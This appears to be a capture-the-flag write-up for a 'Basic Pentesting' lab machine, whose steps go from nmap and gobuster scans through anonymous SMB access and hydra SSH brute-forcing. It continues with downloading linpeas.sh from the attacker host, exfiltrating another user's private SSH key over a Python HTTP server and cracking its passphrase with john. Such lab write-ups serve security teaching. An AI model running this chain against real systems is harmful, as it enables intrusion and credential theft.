# Basic Pentesting

---

### [Task 1] Web App Testing and Privilege Escalation

- Find the services exposed by the machine

  **Solution:**

  > *Note: No solution needed*

  ~~~bash
  $ nmap 10.10.49.233 
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 23:16 CEST
  Nmap scan report for 10.10.49.233
  Host is up (0.082s latency).
  Not shown: 996 closed ports
  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  139/tcp open  netbios-ssn
  445/tcp open  microsoft-ds
  
  Nmap done: 1 IP address (1 host up) scanned in 5.42 seconds
  ~~~

- What is the name of the hidden directory on the web server(enter name without /)?

  **Solution: /development**

  ~~~bash
  $ gobuster dir -u 10.10.49.233 -w /usr/share/wordlists/dirb/big.txt 
  ===============================================================
  Gobuster v3.0.1
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  ===============================================================
  [+] Url:            http://10.10.49.233
  [+] Threads:        10
  [+] Wordlist:       /usr/share/wordlists/dirb/big.txt
  [+] Status codes:   200,204,301,302,307,401,403
  [+] User Agent:     gobuster/3.0.1
  [+] Timeout:        10s
  ===============================================================
  2020/10/11 23:20:24 Starting gobuster
  ===============================================================
  /.htaccess (Status: 403)
  /.htpasswd (Status: 403)
  /development (Status: 301)
  /server-status (Status: 403)
  ===============================================================
  2020/10/11 23:21:54 Finished
  ===============================================================
  ~~~

- What is the username?

  **Solution: Jan**

  > *The server has SMB. So, we can use `smbclient` to try to find if there is any information about the usernames.*

  ~~~bash
  $ smbclient -L 10.10.49.233
  Enter WORKGROUP password: 
  
  	Sharename       Type      Comment
  	---------       ----      -------
  	Anonymous       Disk      
  	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
  SMB1 disabled -- no workgroup available
  $ smbclient //10.10.49.233/Anonymous 
  Try "help" to get a list of possible commands.
  smb: \> ls
    .                                   D        0  Thu Apr 19 19:31:20 2018
    ..                                  D        0  Thu Apr 19 19:13:06 2018
    staff.txt                           N      173  Thu Apr 19 19:29:55 2018
  
  		14318640 blocks of size 1024. 11092980 blocks available
  smb: \> get staff.txt 
  getting file \staff.txt of size 173 as staff.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
  smb: \> ^C
  $ cat staff.txt 
  Announcement to staff:
  
  PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
  this is how mistakes happen. (This means you too, Jan!)
  
  -Kay
  ~~~

- What is the password?

  **Solution: armando**

  > *Using `hydra` to bruteforce the password.*

  ~~~bash
  $ hydra -l jan -P wordlist/rockyou.txt 10.10.49.233 ssh
  Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-12 00:04:59
  [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344409 login tries (l:1/p:14344409), ~896526 tries per task
  [DATA] attacking ssh://10.10.49.233:22/
  [STATUS] 181.00 tries/min, 181 tries in 00:01h, 14344233 to do in 1320:50h, 16 active
  [STATUS] 131.00 tries/min, 393 tries in 00:03h, 14344021 to do in 1824:57h, 16 active
  [22][ssh] host: 10.10.49.233   login: jan   password: armando
  1 of 1 target successfully completed, 1 valid password found
  [WARNING] Writing restore file because 5 final worker threads did not complete until end.
  [ERROR] 5 targets did not resolve or could not be connected
  [ERROR] 0 target did not complete
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-12 00:11:33
  ~~~

- What service do you use to access the server(answer in abbreviation in all caps)?

  **Solution: ssh** 

- Enumerate the machine to find any vectors for privilege escalation

  **Solution:**

  > *Note: No solution needed*
  >
  > In the local site, we set up a simple http server with python for transfer [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) (enumeration script).

  ~~~bash
  $ python3 -m "http.server"
  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  ~~~

  > On the victim´s machine, we download the linpeas.sh script in the `/tmp` dir.

  ~~~bash
  jan@basic2:~$ cd /tmp/
  jan@basic2:/tmp$ ls
  hsperfdata_tomcat9  systemd-private-35ad2925e499421b962bd6e59a5db9e8-systemd-timesyncd.service-WsXIAD
  jan@basic2:/tmp$ mkdir wget
  jan@basic2:/tmp$ cd wget/
  jan@basic2:/tmp/wget$ ls
  jan@basic2:/tmp/wget$ wget 10.9.90.233:8000/linpeas.sh
  --2020-10-11 18:15:36--  http://10.9.90.233:8000/linpeas.sh
  Connecting to 10.9.90.233:8000... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 294777 (288K) [text/x-sh]
  Saving to: ‘linpeas.sh’
  
  linpeas.sh                    100%[=================================================>] 287.87K   431KB/s    in 0.7s    
  
  2020-10-11 18:15:37 (431 KB/s) - ‘linpeas.sh’ saved [294777/294777]
  ~~~

- What is the name of the other user you found(all lower case)?

  **Solution: kay**

  > In the terminal output, after executing linpeas.sh enumeration script.

  ~~~bash
  (...)
  [+] Users with console
  jan:x:1001:1001::/home/jan:/bin/bash
  kay:x:1000:1000:Kay,,,:/home/kay:/bin/bash
  root:x:0:0:root:/root:/bin/bash
  (...)
  ~~~

- If you have found another user, what can you do with this information?

  **Solution:**

  > *Note: No solution needed*
  >
  > In the terminal output, after executing linpeas.sh enumeration script.

  ~~~bash
  (...)
  [+] Searching ssl/ssh files
  /home/kay/.ssh/authorized_keys
  /home/kay/.ssh/id_rsa
  /home/kay/.ssh/id_rsa.pub
  Port 22
  PermitRootLogin prohibit-password
  PubkeyAuthentication yes
  PermitEmptyPasswords no
  ChallengeResponseAuthentication no
  UsePAM yes
  Possible private SSH keys were found!
  /home/kay/.ssh/id_rsa
   --> /etc/hosts.allow file found, read the rules:
  /etc/hosts.allow
  
  
  Searching inside /etc/ssh/ssh_config for interesting info
  Host *
      SendEnv LANG LC_*
      HashKnownHosts yes
      GSSAPIAuthentication yes
      GSSAPIDelegateCredentials no
  (...)
  ~~~

  > We need to use the private key to connect with kay user via ssh.

  ~~~bash
  jan@basic2:~$ cd /home/kay/.ssh/
  jan@basic2:/home/kay/.ssh$ ls
  authorized_keys  id_rsa  id_rsa.pub
  jan@basic2:/home/kay/.ssh$ python3 -m "http.server"
  Serving HTTP on 0.0.0.0 port 8000 ...
  ~~~

  ~~~bash
  $ wget 10.10.49.233:8000/id_rsa
  --2020-10-12 01:09:48--  http://10.10.49.233:8000/id_rsa
  Connecting to 10.10.49.233:8000... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 3326 (3.2K) [application/octet-stream]
  Saving to: ‘id_rsa’
  
  id_rsa                        100%[=================================================>]   3.25K  --.-KB/s    in 0.001s  
  
  2020-10-12 01:09:48 (3.80 MB/s) - ‘id_rsa’ saved [3326/3326]
  $ chmod 400 id_rsa
  $ ssh -i id_rsa kay@10.10.49.233
  load pubkey "id_rsa": invalid format
  Enter passphrase for key 'id_rsa': 
  ~~~

  > The private key is passphrase protected. For that issue, we can use `ssh2john` and `jhon` for bruteforcing the passphrase. 

  ~~~bash
  $ python3 git/ssh2john/ssh2john.py id_rsa > id_rsa.txt
  $ john id_rsa.txt --wordlist=wordlist/rockyou.txt 
  Using default input encoding: UTF-8
  Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
  Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
  Cost 2 (iteration count) is 1 for all loaded hashes
  Will run 8 OpenMP threads
  Note: This format may emit false positives, so it will keep trying even after
  finding a possible candidate.
  Press 'q' or Ctrl-C to abort, almost any other key for status
  beeswax          (./id_rsa)
  1g 0:00:00:03 DONE (2020-10-12 01:05) 0.3095g/s 4439Kp/s 4439Kc/s 4439KC/s    000..*7Â¡Vamos!
  Session completed
  ~~~

- What is the final password you obtain?

  **Solution: heresareallystrongpasswordthatfollowsthepasswordpolicy$$**

  > Knowing the passphrase (*beeswax*), we can now connect to kay with the private key.

  ~~~bash
  $ ssh -i id_rsa kay@10.10.49.233 
  Enter passphrase for key 'id_rsa': 
  Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
  
   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage
  
  0 packages can be updated.
  0 updates are security updates.
  
  
  Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
  kay@basic2:~$ ls
  pass.bak
  kay@basic2:~$ cat pass.bak 
  heresareallystrongpasswordthatfollowsthepasswordpolicy$$
  ~~~

---

